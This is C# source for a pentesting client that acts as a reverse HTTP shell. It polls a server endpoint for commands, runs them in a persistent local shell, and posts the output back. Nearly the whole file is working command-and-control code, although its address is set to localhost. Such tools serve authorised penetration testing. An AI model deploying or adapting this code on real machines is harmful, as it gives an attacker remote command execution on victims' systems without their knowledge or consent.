using Newtonsoft.Json;
using PentestingCommon;
using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace PentestingClient
{
    class Program
    {
        public static bool KeepAlive { get; set; } = true; // todo: get this from server
        public static PersistentShell Shell { get; set; }
        public static string Address { get; set; } = "https://localhost:44349/api/ReverseHttpShell";
        public static int Id { get; set; } = 0; // todo: should get this from server

        static async Task Main(string[] args)
        {
            // create shell
            Shell = new PersistentShell();

            // start recieving commands
            RecieveCommandsAsync();
            // wait until
            await SendOutput();
        }

        private static async Task SendOutput()
        {
            while (KeepAlive)
            {
                // wait for shell output
                var output = await Shell.WaitForShellOutput();

                // if output isn't null or empty
                if (!string.IsNullOrEmpty(output))
                {
                    // clear current output
                    Shell.CurrentOutput.Clear();

                    // create standard output object
                    var outputObj = new StandardOutputObject
                    {
                        Id = Id,
                        Output = output
                    };
                    // create json
                    var json = JsonConvert.SerializeObject(outputObj);
                    // create string content object
                    var data = new StringContent(json, Encoding.UTF8, "application/json");
                    // create http client
                    using var client = new HttpClient();

                    // post data
                    var response = await client.PostAsync(Address, data);
                }
            }
        }

        /// <summary>
        /// Recieve commands from <seealso cref="Address"/> asynchronously.
        /// </summary>
        private static async void RecieveCommandsAsync()
        {
            while (KeepAlive)
            {
                await Task.Delay(10);

                // create http client
                using var client = new HttpClient();
                var responseStr = await client.GetStringAsync($"{Address}/{Id}/{false}");
                // if response isn't null or empty write command to shell
                if (!string.IsNullOrEmpty(responseStr))
                {
                    Shell.Write(new StandardInputObject { Id = Id, Input = responseStr });
                }
            }
        }
    }
}
